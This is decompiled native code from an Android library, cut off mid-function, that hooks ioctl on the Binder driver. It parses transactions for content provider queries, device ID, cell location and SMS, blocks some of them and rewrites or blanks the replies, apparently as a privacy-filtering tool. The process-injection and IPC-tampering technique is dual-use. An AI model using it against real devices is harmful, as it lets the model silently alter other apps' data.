/* Function: Parcel @ 00011788 */

void __thiscall android::Parcel::Parcel(Parcel *this)

{
  (*(code *)PTR_Parcel_00014f38)(this);
  return;
}



/* Function: self @ 00011794 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::IPCThreadState::self(void)

{
  (*(code *)PTR_self_00014f3c)();
  return;
}



/* Function: sendReply @ 000117a0 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::IPCThreadState::sendReply(Parcel *param_1,uint param_2)

{
  (*(code *)PTR_sendReply_00014f40)(param_1);
  return;
}



/* Function: ~Parcel @ 000117ac */

void __thiscall android::Parcel::~Parcel(Parcel *this)

{
  (*(code *)PTR__Parcel_00014f44)(this);
  return;
}



/* Function: memset @ 000117b8 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memset(void *__s,int __c,size_t __n)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memset_00014f48)(__s);
  return pvVar1;
}



/* Function: __android_log_print @ 000117c4 */

void __android_log_print(void)

{
  (*(code *)PTR___android_log_print_00014f4c)();
  return;
}



/* Function: setData @ 000117d0 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::setData(uchar *param_1,uint param_2)

{
  (*(code *)PTR_setData_00014f50)(param_1);
  return;
}



/* Function: setDataPosition @ 000117dc */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::setDataPosition(uint param_1)

{
  (*(code *)PTR_setDataPosition_00014f54)(param_1);
  return;
}



/* Function: readInt32 @ 000117e8 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::readInt32(void)

{
  (*(code *)PTR_readInt32_00014f58)();
  return;
}



/* Function: readString16 @ 000117f4 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::readString16(void)

{
  (*(code *)PTR_readString16_00014f5c)();
  return;
}



/* Function: strcmp @ 00011800 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int strcmp(char *__s1,char *__s2)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_strcmp_00014f60)(__s1);
  return iVar1;
}



/* Function: strstr @ 0001180c */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strstr(char *__haystack,char *__needle)

{
  char *pcVar1;
  
  pcVar1 = (char *)(*(code *)PTR_strstr_00014f64)(__haystack);
  return pcVar1;
}



/* Function: ~String16 @ 00011818 */

void __thiscall android::String16::~String16(String16 *this)

{
  (*(code *)PTR__String16_00014f68)(this);
  return;
}



/* Function: dataPosition @ 00011824 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::dataPosition(void)

{
  (*(code *)PTR_dataPosition_00014f6c)();
  return;
}



/* Function: memcpy @ 00011830 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memcpy(void *__dest,void *__src,size_t __n)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memcpy_00014f70)(__dest);
  return pvVar1;
}



/* Function: __stack_chk_fail @ 0001183c */

void __stack_chk_fail(void)

{
  (*(code *)PTR___stack_chk_fail_00014f74)();
  return;
}



/* Function: readObject @ 00011848 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::readObject(bool param_1)

{
  (*(code *)PTR_readObject_00014f78)(param_1);
  return;
}



/* Function: ipcData @ 00011854 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::ipcData(void)

{
  (*(code *)PTR_ipcData_00014f7c)();
  return;
}



/* Function: ipcDataSize @ 00011860 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void android::Parcel::ipcDataSize(void)

{
  (*(code *)PTR_ipcDataSize_00014f80)();
  return;
}



/* Function: pthread_getspecific @ 0001186c */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * pthread_getspecific(pthread_key_t __key)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_pthread_getspecific_00014f84)(__key);
  return pvVar1;
}



/* Function: pthread_setspecific @ 00011878 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_setspecific(pthread_key_t __key,void *__pointer)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pthread_setspecific_00014f88)(__key);
  return iVar1;
}



/* Function: ioctl @ 00011884 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int ioctl(int __fd,ulong __request,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_ioctl_00014f8c)(__fd);
  return iVar1;
}



/* Function: pthread_key_create @ 00011890 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_key_create(pthread_key_t *__key,__destr_function *__destr_function)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pthread_key_create_00014f90)(__key);
  return iVar1;
}



/* Function: strcpy @ 0001189c */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strcpy(char *__dest,char *__src)

{
  char *pcVar1;
  
  pcVar1 = (char *)(*(code *)PTR_strcpy_00014f94)(__dest);
  return pcVar1;
}



/* Function: pthread_create @ 000118a8 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_create(pthread_t *__newthread,pthread_attr_t *__attr,__start_routine *__start_routine,
                  void *__arg)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pthread_create_00014f98)(__newthread);
  return iVar1;
}



/* Function: malloc @ 000118b4 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * malloc(size_t __size)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_malloc_00014f9c)(__size);
  return pvVar1;
}



/* Function: lseek @ 000118c0 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__off_t lseek(int __fd,__off_t __offset,int __whence)

{
  __off_t _Var1;
  
  _Var1 = (*(code *)PTR_lseek_00014fa0)(__fd);
  return _Var1;
}



/* Function: free @ 000118cc */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void free(void *__ptr)

{
  (*(code *)PTR_free_00014fa4)(__ptr);
  return;
}



/* Function: __errno @ 000118d8 */

void __errno(void)

{
  (*(code *)PTR___errno_00014fa8)();
  return;
}



/* Function: read @ 000118e4 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t read(int __fd,void *__buf,size_t __nbytes)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_read_00014fac)(__fd);
  return sVar1;
}



/* Function: sysconf @ 000118f0 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

long sysconf(int __name)

{
  long lVar1;
  
  lVar1 = (*(code *)PTR_sysconf_00014fb0)(__name);
  return lVar1;
}



/* Function: open @ 000118fc */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int open(char *__file,int __oflag,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_open_00014fb4)(__file);
  return iVar1;
}



/* Function: close @ 00011908 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int close(int __fd)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_close_00014fb8)(__fd);
  return iVar1;
}



/* Function: mprotect @ 00011914 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int mprotect(void *__addr,size_t __len,int __prot)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_mprotect_00014fbc)(__addr);
  return iVar1;
}



/* Function: strlen @ 00011920 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t strlen(char *__s)

{
  size_t sVar1;
  
  sVar1 = (*(code *)PTR_strlen_00014fc0)(__s);
  return sVar1;
}



/* Function: socket @ 0001192c */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int socket(int __domain,int __type,int __protocol)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_socket_00014fc4)(__domain);
  return iVar1;
}



/* Function: connect @ 00011938 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int connect(int __fd,sockaddr *__addr,socklen_t __len)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_connect_00014fc8)(__fd);
  return iVar1;
}



/* Function: write @ 00011944 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t write(int __fd,void *__buf,size_t __n)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_write_00014fcc)(__fd);
  return sVar1;
}



/* Function: bind @ 00011950 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int bind(int __fd,sockaddr *__addr,socklen_t __len)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_bind_00014fd0)(__fd);
  return iVar1;
}



/* Function: listen @ 0001195c */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int listen(int __fd,int __n)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_listen_00014fd4)(__fd);
  return iVar1;
}



/* Function: accept @ 00011968 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int accept(int __fd,sockaddr *__addr,socklen_t *__addr_len)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_accept_00014fd8)(__fd);
  return iVar1;
}



/* Function: fopen @ 00011974 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

FILE * fopen(char *__filename,char *__modes)

{
  FILE *pFVar1;
  
  pFVar1 = (FILE *)(*(code *)PTR_fopen_00014fdc)(__filename);
  return pFVar1;
}



/* Function: fseek @ 00011980 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fseek(FILE *__stream,long __off,int __whence)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_fseek_00014fe0)(__stream);
  return iVar1;
}



/* Function: sscanf @ 0001198c */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int sscanf(char *__s,char *__format,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_sscanf_00014fe4)(__s);
  return iVar1;
}



/* Function: fgets @ 00011998 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * fgets(char *__s,int __n,FILE *__stream)

{
  char *pcVar1;
  
  pcVar1 = (char *)(*(code *)PTR_fgets_00014fe8)(__s);
  return pcVar1;
}



/* Function: fclose @ 000119a4 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fclose(FILE *__stream)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_fclose_00014fec)(__stream);
  return iVar1;
}



/* Function: snprintf @ 000119b0 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int snprintf(char *__s,size_t __maxlen,char *__format,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_snprintf_00014ff0)(__s);
  return iVar1;
}



/* Function: strtok @ 000119bc */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * strtok(char *__s,char *__delim)

{
  char *pcVar1;
  
  pcVar1 = (char *)(*(code *)PTR_strtok_00014ff4)(__s);
  return pcVar1;
}



/* Function: strtoul @ 000119c8 */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ulong strtoul(char *__nptr,char **__endptr,int __base)

{
  ulong uVar1;
  
  uVar1 = (*(code *)PTR_strtoul_00014ff8)(__nptr);
  return uVar1;
}



/* Function: FUN_000119e0 @ 000119e0 */

undefined1 * FUN_000119e0(int param_1,undefined1 *param_2)

{
  short *psVar1;
  undefined1 *puVar2;
  int iVar3;
  
  puVar2 = param_2;
  if (param_1 != 0) {
    iVar3 = 0;
    while ((psVar1 = (short *)(param_1 + iVar3), *psVar1 != 0 && (iVar3 = iVar3 + 2, iVar3 != 0x100)
           )) {
      *puVar2 = (char)*psVar1;
      puVar2 = puVar2 + 1;
    }
  }
  *puVar2 = 0;
  return param_2;
}



/* Function: hook_sendReply @ 00011a04 */

void hook_sendReply(void)

{
  Parcel *pPVar1;
  Parcel aPStack_38 [52];
  
  android::Parcel::Parcel(aPStack_38);
  pPVar1 = (Parcel *)android::IPCThreadState::self();
  android::IPCThreadState::sendReply(pPVar1,(uint)aPStack_38);
  android::Parcel::~Parcel(aPStack_38);
  return;
}



/* Function: parse_requestdata @ 00011a24 */

void parse_requestdata(int param_1,uint param_2,int param_3,void *param_4,int *param_5,
                      undefined4 *param_6)

{
  undefined1 *puVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  void *__dest;
  undefined4 uVar5;
  size_t __n;
  int iVar6;
  int *piVar7;
  uint uVar8;
  undefined4 local_36c;
  undefined4 local_368;
  void *local_364;
  void *local_360;
  Parcel aPStack_35c [48];
  char acStack_32c [256];
  char acStack_22c [256];
  char acStack_12c [256];
  int local_2c;
  
  piVar7 = *(int **)(DAT_00011d8c + 0x11a3a);
  local_2c = *piVar7;
  android::Parcel::Parcel(aPStack_35c);
  memset(acStack_32c,0,0x100);
  uVar8 = 1 - param_2;
  if (1 < param_2) {
    uVar8 = 0;
  }
  if (param_3 == 0) {
    uVar8 = uVar8 | 1;
  }
  if (uVar8 != 0) {
    uVar5 = 0;
    __android_log_print(6,DAT_00011d90 + 0x11a86,DAT_00011d94 + 0x11a8a,param_3);
    goto LAB_00011d6e;
  }
  android::Parcel::setData((uchar *)aPStack_35c,param_2);
  android::Parcel::setDataPosition((uint)aPStack_35c);
  android::Parcel::readInt32();
  android::Parcel::readString16();
  FUN_000119e0(local_36c,acStack_32c);
  iVar2 = strcmp(acStack_32c,*(char **)(DAT_00011d98 + 0x11abe));
  if (iVar2 == 0) {
    memset(acStack_22c,0,0x100);
    if (param_1 == 1) {
      iVar2 = android::Parcel::readInt32();
      android::Parcel::readString16();
      FUN_000119e0(local_368,acStack_22c);
      iVar3 = strcmp(acStack_22c,*(char **)(DAT_00011d9c + 0x11b00));
      if (((iVar3 == 0) ||
          (iVar3 = strcmp(acStack_22c,*(char **)(DAT_00011da0 + 0x11b0e)), iVar3 == 0)) ||
         (iVar3 = strcmp(acStack_22c,*(char **)(DAT_00011da4 + 0x11b1c)), iVar3 == 0)) {
        puVar1 = &stack0xffffffec;
LAB_00011c42:
        android::String16::~String16((String16 *)(puVar1 + -0x354));
        uVar5 = 0;
      }
      else {
        pcVar4 = strstr(acStack_22c,*(char **)(DAT_00011da8 + 0x11b2e));
        uVar5 = 1;
        if (pcVar4 == (char *)0x0) {
          uVar5 = 2;
          pcVar4 = strstr(acStack_22c,*(char **)(DAT_00011dac + 0x11b3e));
          if (pcVar4 == (char *)0x0) {
            pcVar4 = strstr(acStack_22c,(char *)(DAT_00011db0 + 0x11b4c));
            if (pcVar4 == (char *)0x0) {
              uVar5 = 0;
            }
            else {
              uVar5 = 3;
            }
          }
        }
        if (iVar2 == 3) {
          iVar2 = android::Parcel::readInt32();
          for (iVar3 = 0; iVar3 < iVar2; iVar3 = iVar3 + 1) {
            android::Parcel::readString16();
            android::String16::~String16((String16 *)&local_364);
          }
          android::Parcel::readString16();
          memset(acStack_12c,0,0x100);
          FUN_000119e0(local_360,acStack_12c);
          pcVar4 = strstr(acStack_12c,*(char **)(DAT_00011db4 + 0x11ba0));
          if (pcVar4 != (char *)0x0) {
            uVar5 = 3;
          }
          pcVar4 = strstr(acStack_12c,*(char **)(DAT_00011db8 + 0x11baa));
          if (pcVar4 == (char *)0x0) {
            pcVar4 = strstr(acStack_12c,*(char **)(DAT_00011dbc + 0x11bc0));
            if (pcVar4 != (char *)0x0) {
              uVar5 = 2;
            }
          }
          else {
            uVar5 = 1;
          }
          android::String16::~String16((String16 *)&local_360);
        }
        android::String16::~String16((String16 *)&local_368);
      }
    }
    else {
      uVar5 = 0;
    }
  }
  else {
    iVar2 = strcmp(acStack_32c,*(char **)(DAT_00011dc0 + 0x11be4));
    if (((iVar2 == 0) ||
        (iVar2 = strcmp(acStack_32c,*(char **)(DAT_00011dc4 + 0x11bf2)), iVar2 == 0)) ||
       (iVar2 = strcmp(acStack_32c,*(char **)(DAT_00011dc8 + 0x11c00)), iVar2 == 0)) {
      uVar5 = android::Parcel::dataPosition();
      *param_6 = uVar5;
      android::Parcel::readString16();
      memset(acStack_22c,0,0x100);
      FUN_000119e0(local_364,acStack_22c);
      __n = (*(uint *)((int)local_364 + -0xc) & 0xfffffffe) - 2;
      if ((int)__n < 2) {
        puVar1 = &stack0xfffffff0;
        goto LAB_00011c42;
      }
      if (0x3fd < (int)__n) {
        __n = 0x3fe;
      }
      memcpy(param_4,local_364,__n);
      *(undefined1 *)((int)param_4 + __n) = 0x2c;
      *(undefined1 *)((int)param_4 + __n + 1) = 0;
      android::Parcel::readInt32();
      iVar2 = android::Parcel::dataPosition();
      iVar3 = __n + 2;
      if ((uint)(param_3 - iVar2) < 0x8d) {
        iVar2 = 1;
      }
      else {
        iVar2 = android::Parcel::readInt32();
        android::Parcel::dataPosition();
        android::Parcel::setDataPosition((uint)aPStack_35c);
        android::Parcel::readString16();
        if ((*(uint *)((int)local_360 + -0xc) >> 1) - 1 < 0x15) {
          if (5 < iVar2) {
            iVar2 = 6;
          }
          android::Parcel::setDataPosition((uint)aPStack_35c);
        }
        else {
          iVar2 = 1;
          android::Parcel::setDataPosition((uint)aPStack_35c);
        }
        android::String16::~String16((String16 *)&local_360);
      }
      iVar6 = 0;
      while (iVar6 < iVar2) {
        android::Parcel::readString16();
        memset(acStack_12c,0,0x100);
        FUN_000119e0(local_360,acStack_12c);
        iVar6 = iVar6 + 1;
        uVar8 = (*(uint *)((int)local_360 + -0xc) & 0xfffffffe) - 2;
        if ((int)(0x400U - iVar3) < (int)uVar8) {
          uVar8 = 0x400U - iVar3;
        }
        uVar8 = uVar8 & ~((int)uVar8 >> 0x1f);
        __dest = (void *)((int)param_4 + iVar3);
        iVar3 = iVar3 + uVar8;
        memcpy(__dest,local_360,uVar8);
        android::String16::~String16((String16 *)&local_360);
      }
      *param_5 = iVar3;
      android::String16::~String16((String16 *)&local_364);
      uVar5 = 0xb;
    }
    else {
      iVar2 = strcmp(acStack_32c,*(char **)(DAT_00011dcc + 0x11d34));
      if (iVar2 == 0) {
        if (param_1 - 0x1bU < 2) {
          uVar5 = 0x14;
        }
        else {
          uVar5 = 0;
        }
      }
      else {
        iVar2 = strcmp(acStack_32c,*(char **)(DAT_00011dd0 + 0x11d4e));
        if (iVar2 == 0) {
          if (param_1 == 1) {
            uVar5 = 0x26;
          }
          else if (param_1 == 4) {
            uVar5 = 0x27;
          }
          else {
            uVar5 = 0;
          }
        }
        else {
          uVar5 = 0;
        }
      }
    }
  }
  android::String16::~String16((String16 *)&local_36c);
LAB_00011d6e:
  android::Parcel::~Parcel(aPStack_35c);
  if (local_2c != *piVar7) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar5);
  }
  return;
}



/* Function: set_contentprivider_query_reply @ 00011dd4 */

/* android::set_contentprivider_query_reply(unsigned char*, unsigned int) */

int android::set_contentprivider_query_reply(uchar *param_1,uint param_2)

{
  uchar *puVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  String16 aSStack_4c [4];
  Parcel aPStack_48 [52];
  
  __android_log_print(6,DAT_00011e88 + 0x11de8,DAT_00011e84 + 0x11de4);
  android::Parcel::Parcel(aPStack_48);
  android::Parcel::setData((uchar *)aPStack_48,(uint)param_1);
  android::Parcel::setDataPosition((uint)aPStack_48);
  iVar2 = android::Parcel::readInt32();
  if ((iVar2 == 0) && (*(int *)param_1 == 0)) {
    if (*(int *)(param_1 + 4) == 1) {
      android::Parcel::readInt32();
      android::Parcel::readObject((bool)((char)&stack0xffffffec + -0x34));
      iVar3 = android::Parcel::readInt32();
      if (-1 < iVar3) {
        for (iVar4 = 0; iVar4 != iVar3; iVar4 = iVar4 + 1) {
          android::Parcel::readString16();
          android::String16::~String16(aSStack_4c);
        }
        android::Parcel::readInt32();
        iVar3 = android::Parcel::dataPosition();
        puVar1 = param_1 + iVar3;
        puVar1[0] = '\0';
        puVar1[1] = '\0';
        puVar1[2] = '\0';
        puVar1[3] = '\0';
      }
    }
    else {
      android::Parcel::readObject((bool)((char)&stack0xffffffec + -0x34));
      iVar3 = android::Parcel::dataPosition();
      puVar1 = param_1 + iVar3;
      puVar1[0] = '\0';
      puVar1[1] = '\0';
      puVar1[2] = '\0';
      puVar1[3] = '\0';
      puVar1 = param_1 + iVar3 + 4;
      puVar1[0] = '\0';
      puVar1[1] = '\0';
      puVar1[2] = '\0';
      puVar1[3] = '\0';
    }
  }
  android::Parcel::~Parcel(aPStack_48);
  return iVar2;
}



/* Function: set_cell_location_reply @ 00011e8c */

/* android::set_cell_location_reply(unsigned char*, unsigned int&) */

void android::set_cell_location_reply(uchar *param_1,uint *param_2)

{
  *param_2 = 8;
  param_1[0] = '\0';
  param_1[1] = '\0';
  param_1[2] = '\0';
  param_1[3] = '\0';
  param_1[4] = '\0';
  param_1[5] = '\0';
  param_1[6] = '\0';
  param_1[7] = '\0';
  return;
}



/* Function: set_sendsms_reply @ 00011e9a */

/* android::set_sendsms_reply(unsigned char*, unsigned int&) */

void android::set_sendsms_reply(uchar *param_1,uint *param_2)

{
  *param_2 = 4;
  param_1[0] = '\0';
  param_1[1] = '\0';
  param_1[2] = '\0';
  param_1[3] = '\0';
  return;
}



/* Function: modify_reply @ 00011ea8 */

undefined4 modify_reply(uchar *param_1,uint param_2,int param_3)

{
  __android_log_print(6,DAT_00011ef4 + 0x11ebc,DAT_00011ef0 + 0x11eb8,param_3);
  if (param_3 == 0xb) {
    param_1[0] = '\0';
    param_1[1] = '\0';
    param_1[2] = '\0';
    param_1[3] = '\0';
  }
  else if (param_3 < 0xc) {
    if (param_3 - 1U < 3) {
      android::set_contentprivider_query_reply(param_1,param_2);
    }
  }
  else if (param_3 == 0x14) {
    param_1[0] = '\0';
    param_1[1] = '\0';
    param_1[2] = '\0';
    param_1[3] = '\0';
    param_1[4] = '\0';
    param_1[5] = '\0';
    param_1[6] = '\0';
    param_1[7] = '\0';
  }
  return 0;
}



/* Function: print_parcel @ 00011ef8 */

/* android::print_parcel(android::Parcel const&) */

void android::print_parcel(Parcel *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar2 = android::Parcel::ipcData();
  iVar1 = DAT_00011f38;
  iVar5 = DAT_00011f34 + 0x11f0a;
  iVar3 = android::Parcel::ipcDataSize();
  for (iVar4 = 0; iVar4 != iVar3; iVar4 = iVar4 + 1) {
    __android_log_print(6,iVar5,iVar1 + 0x11f20,iVar4,*(undefined1 *)(iVar2 + iVar4),
                        *(undefined1 *)(iVar2 + iVar4));
  }
  return;
}



/* Function: set_deviceid_reply @ 00011f3c */

/* android::set_deviceid_reply(unsigned char*, unsigned int&) */

undefined4 android::set_deviceid_reply(uchar *param_1,uint *param_2)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int local_44;
  Parcel aPStack_40 [48];
  
  android::Parcel::Parcel(aPStack_40);
  android::Parcel::setData((uchar *)aPStack_40,(uint)param_1);
  print_parcel(aPStack_40);
  android::Parcel::readInt32();
  iVar1 = android::Parcel::dataPosition();
  android::Parcel::readString16();
  uVar2 = *(uint *)(local_44 + -0xc);
  for (iVar3 = 0; iVar3 < (int)((uVar2 >> 1) - 1); iVar3 = iVar3 + 1) {
    if (param_1[iVar3 + iVar1 + 4] != '\0') {
      param_1[iVar3 + iVar1 + 4] = param_1[iVar3 + iVar1 + 4] + '\x01';
    }
  }
  android::Parcel::setData((uchar *)aPStack_40,(uint)param_1);
  print_parcel(aPStack_40);
  android::String16::~String16((String16 *)&local_44);
  android::Parcel::~Parcel(aPStack_40);
  return 0;
}



/* Function: FUN_00011fb0 @ 00011fb0 */

void FUN_00011fb0(uint *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint *puVar4;
  int *piVar5;
  undefined4 local_424;
  uint local_420;
  undefined1 auStack_41c [1024];
  int local_1c;
  
  piVar5 = *(int **)(DAT_00012160 + 0x11fc6);
  local_1c = *piVar5;
  puVar4 = param_1 + 1;
  uVar3 = *param_1;
  if (uVar3 == DAT_00012148) {
    __android_log_print(3,DAT_00012164 + 0x11fe4,DAT_00012168 + 0x11fe8,param_1[1]);
  }
  else {
    if (0x11 < (uVar3 & 0xff)) {
      __android_log_print(3,DAT_0001216c + 0x11ffc,DAT_00012170 + 0x11ffe);
      goto LAB_0001212a;
    }
    if (DAT_0001214c < (int)uVar3) {
      if (uVar3 == DAT_00012158) {
        local_424 = 0;
        uVar3 = param_1[6];
        local_420 = uVar3;
        if ((*(int *)(DAT_00012174 + 0x1204e) == 1) && (*(uint *)(DAT_00012178 + 0x1205a) != uVar3))
        {
          iVar1 = parse_requestdata(param_1[3],param_1[9],param_1[7],auStack_41c,&local_424,
                                    &local_420);
          if (iVar1 != 0) {
            if (2 < iVar1 - 1U) {
              iVar2 = is_block(iVar1,uVar3,auStack_41c,local_424);
              if (iVar2 < 1) goto LAB_0001211a;
              if (iVar1 == 0x28 || iVar1 == 0x14) goto LAB_000120fe;
              if (iVar1 == 0xb) goto LAB_00012114;
            }
LAB_00012118:
            *param_2 = iVar1;
          }
        }
        else if (((10000 < uVar3) &&
                 (((iVar1 = is_whitelist(uVar3), iVar1 == 0 &&
                   (*(uint *)(DAT_0001217c + 0x120be) != uVar3)) &&
                  (iVar1 = parse_requestdata(param_1[3],param_1[9],param_1[7],auStack_41c,&local_424
                                             ,&local_420), iVar1 != 0)))) &&
                (iVar2 = is_block(iVar1,uVar3,auStack_41c,local_424), 0 < iVar2)) {
          if (iVar1 == 0x28 || iVar1 == 0x14) {
LAB_000120fe:
            uVar3 = 0x5e;
          }
          else {
            if (iVar1 != 0xb) goto LAB_00012118;
            __android_log_print(3,DAT_00012180 + 74000,DAT_00012184 + 0x12112);
LAB_00012114:
            uVar3 = 0x52;
          }
          param_1[7] = uVar3;
          goto LAB_00012118;
        }
      }
      else if (uVar3 != DAT_00012158 + 1) {
        if (uVar3 == DAT_0001215c) {
          puVar4 = param_1 + 4;
        }
        goto LAB_0001212a;
      }
LAB_0001211a:
      puVar4 = param_1 + 0xb;
      goto LAB_0001212a;
    }
    if (DAT_0001214c + -3 <= (int)uVar3) {
      puVar4 = param_1 + 3;
      goto LAB_0001212a;
    }
    if ((uVar3 != DAT_00012150) && (((int)uVar3 < (int)DAT_00012150 || (1 < uVar3 + DAT_00012154))))
    goto LAB_0001212a;
  }
  puVar4 = param_1 + 2;
LAB_0001212a:
  if (local_1c == *piVar5) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(puVar4);
}



/* Function: hooked_ioctl @ 00012188 */

int hooked_ioctl(int param_1,ulong param_2,int *param_3)

{
  void *pvVar1;
  int iVar2;
  uint *puVar3;
  uint uVar4;
  int iVar5;
  pthread_key_t *ppVar6;
  int iVar7;
  uint uVar8;
  uint *puVar9;
  uint *puVar10;
  bool bVar11;
  void *local_2c [2];
  
  iVar2 = DAT_000122cc;
  bVar11 = param_2 == DAT_000122b8;
  if ((param_3 != (int *)0x0 && bVar11) && (puVar9 = (uint *)param_3[2], puVar9 != (uint *)0x0)) {
    iVar5 = *param_3;
    iVar7 = DAT_000122d0 + 0x121cc;
    ppVar6 = (pthread_key_t *)(DAT_000122d4 + 0x121ce);
    puVar3 = puVar9;
LAB_00012268:
    do {
      puVar10 = puVar3;
      if ((uint *)((int)puVar9 + iVar5) <= puVar10) break;
      puVar3 = puVar10 + 1;
      uVar4 = *puVar10;
      if ((uVar4 & 0xff) < 0x11) {
        if (DAT_000122bc < (int)uVar4) {
          if (DAT_000122c4 < (int)uVar4) {
            if (uVar4 != DAT_000122c8) {
              if (uVar4 != DAT_000122c8 + 1) goto LAB_00012268;
              pvVar1 = pthread_getspecific(*ppVar6);
              if (0 < (int)pvVar1) {
                modify_reply(puVar10[9],puVar10[7],pvVar1);
                pthread_setspecific(*ppVar6,(void *)0x0);
              }
            }
            puVar3 = puVar10 + 0xb;
            goto LAB_00012268;
          }
          if (((int)uVar4 < DAT_000122c4 + -1) && (uVar4 != DAT_000122c4 - 5U)) goto LAB_00012268;
        }
        else if ((int)uVar4 < DAT_000122bc + -1) {
          uVar8 = DAT_000122c0;
          if (DAT_000122bc + -0x40002 < (int)uVar4) {
LAB_00012210:
            if (uVar4 != uVar8) goto LAB_00012268;
          }
          else if (((int)uVar4 < DAT_000122bc + -0x40005) && (uVar4 != DAT_000122bc - 0x40007U)) {
            uVar8 = DAT_000122bc - 0x40006;
            goto LAB_00012210;
          }
          puVar3 = puVar10 + 2;
          goto LAB_00012268;
        }
        puVar3 = puVar10 + 3;
        goto LAB_00012268;
      }
      __android_log_print(3,iVar2 + 0x121e4,iVar7);
    } while( true );
  }
  iVar2 = ioctl(param_1,param_2,param_3);
  if (((-1 < iVar2) && (param_3 != (int *)0x0 && bVar11)) && (uVar4 = param_3[5], uVar4 != 0)) {
    uVar8 = uVar4 + param_3[4];
    ppVar6 = (pthread_key_t *)(DAT_000122d8 + 0x12290);
    while (uVar4 < uVar8) {
      local_2c[0] = (void *)0x0;
      uVar4 = FUN_00011fb0(uVar4,local_2c);
      if (0 < (int)local_2c[0]) {
        pthread_setspecific(*ppVar6,local_2c[0]);
      }
    }
  }
  return iVar2;
}



/* Function: hook_entry @ 000122dc */

longlong hook_entry(char *param_1,pthread_t param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  int iVar4;
  pthread_t pStack_1c;
  undefined4 uStack_18;
  
  iVar1 = DAT_00012358;
  pStack_1c = param_2;
  uStack_18 = param_3;
  uVar3 = get_module_base(0xffffffff,DAT_00012354 + 0x122ec);
  __android_log_print(3,DAT_0001235c + 0x122f8,DAT_00012360 + 0x122fa,uVar3);
  do {
    iVar4 = pthread_key_create((pthread_key_t *)(iVar1 + 0x122f6),(__destr_function *)0x0);
    iVar2 = DAT_00012370;
  } while (iVar4 != 0);
  uVar3 = elf_hook(DAT_00012364 + 0x1231c,uVar3,DAT_00012368 + 0x1231e,DAT_0001236c + 0x12322);
